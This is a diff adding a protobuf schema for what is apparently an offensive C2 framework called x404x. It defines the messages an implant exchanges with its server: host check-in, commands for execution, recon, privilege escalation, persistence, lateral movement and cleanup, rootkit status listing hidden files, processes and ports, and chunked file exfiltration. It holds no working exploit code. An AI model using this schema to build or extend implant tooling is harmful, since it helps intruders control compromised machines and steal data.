@@ -1,0 +1,151 @@
+syntax = "proto3";
+
+package x404x.v1;
+
+option go_package = "github.com/ruby570bocadito/x404x/core/proto/gen/agent;agentv1";
+
+// AgentService is the bidirectional stream between implant and C2
+service AgentService {
+  // Agent check-in and registration
+  rpc CheckIn(CheckInRequest) returns (CheckInResponse);
+
+  // Bidirectional command stream
+  rpc CommandStream(stream AgentMessage) returns (stream ServerMessage);
+
+  // Heartbeat keep-alive
+  rpc Heartbeat(HeartbeatRequest) returns (HeartbeatResponse);
+
+  // Request file exfiltration
+  rpc Exfiltrate(stream ExfilChunk) returns (ExfilAck);
+}
+
+message CheckInRequest {
+  string agent_id = 1;
+  string hostname = 2;
+  string os = 3;
+  string arch = 4;
+  string username = 5;
+  string local_ip = 6;
+  repeated string privileges = 7;
+  bytes public_key = 8;
+  map<string, string> metadata = 9;
+}
+
+message CheckInResponse {
+  string session_id = 1;
+  bytes server_public_key = 2;
+  int64 heartbeat_interval = 3;
+  repeated PendingTask pending_tasks = 4;
+}
+
+message AgentMessage {
+  string session_id = 1;
+  oneof message {
+    TaskResult task_result = 2;
+    ReconReport recon_data = 3;
+    PrivEscResult privesc_result = 4;
+    KernelStatus kernel_status = 5;
+    HeartbeatRequest heartbeat = 6;
+  }
+}
+
+message ServerMessage {
+  string session_id = 1;
+  oneof message {
+    Command command = 2;
+    HeartbeatResponse heartbeat = 3;
+  }
+}
+
+message Command {
+  string command_id = 1;
+  CommandType type = 2;
+  string payload = 3;
+  int64 timeout = 4;
+
+  enum CommandType {
+    COMMAND_TYPE_UNSPECIFIED = 0;
+    COMMAND_TYPE_EXEC = 1;
+    COMMAND_TYPE_RECON = 2;
+    COMMAND_TYPE_PRIVESC = 3;
+    COMMAND_TYPE_PERSIST = 4;
+    COMMAND_TYPE_LATERAL = 5;
+    COMMAND_TYPE_EXFIL = 6;
+    COMMAND_TYPE_CLEANUP = 7;
+  }
+}
+
+message TaskResult {
+  string command_id = 1;
+  bool success = 2;
+  string output = 3;
+  string error = 4;
+}
+
+message ReconReport {
+  string target = 1;
+  repeated HostInfo hosts = 2;
+  repeated Vulnerability vulns = 3;
+}
+
+message HostInfo {
+  string ip = 1;
+  string hostname = 2;
+  string os = 3;
+  repeated int32 open_ports = 4;
+  repeated string services = 5;
+}
+
+message Vulnerability {
+  string cve = 1;
+  string description = 2;
+  string severity = 3;
+  string service = 4;
+  int32 port = 5;
+}
+
+message PrivEscResult {
+  bool success = 1;
+  string vector = 2;
+  string technique = 3;
+  string output = 4;
+  bool gained_root = 5;
+}
+
+message KernelStatus {
+  bool loaded = 1;
+  string version = 2;
+  repeated string hidden_files = 3;
+  repeated int32 hidden_pids = 4;
+  repeated int32 hidden_ports = 5;
+}
+
+message HeartbeatRequest {
+  string agent_id = 1;
+  int64 timestamp = 2;
+  int32 uptime = 3;
+}
+
+message HeartbeatResponse {
+  bool ok = 1;
+  int64 server_time = 2;
+}
+
+message PendingTask {
+  string task_id = 1;
+  Command.CommandType type = 2;
+  string payload = 3;
+}
+
+message ExfilChunk {
+  string session_id = 1;
+  string filename = 2;
+  int64 total_size = 3;
+  int32 chunk_index = 4;
+  bytes data = 5;
+}
+
+message ExfilAck {
+  bool received = 1;
+  int32 next_chunk = 2;
+}
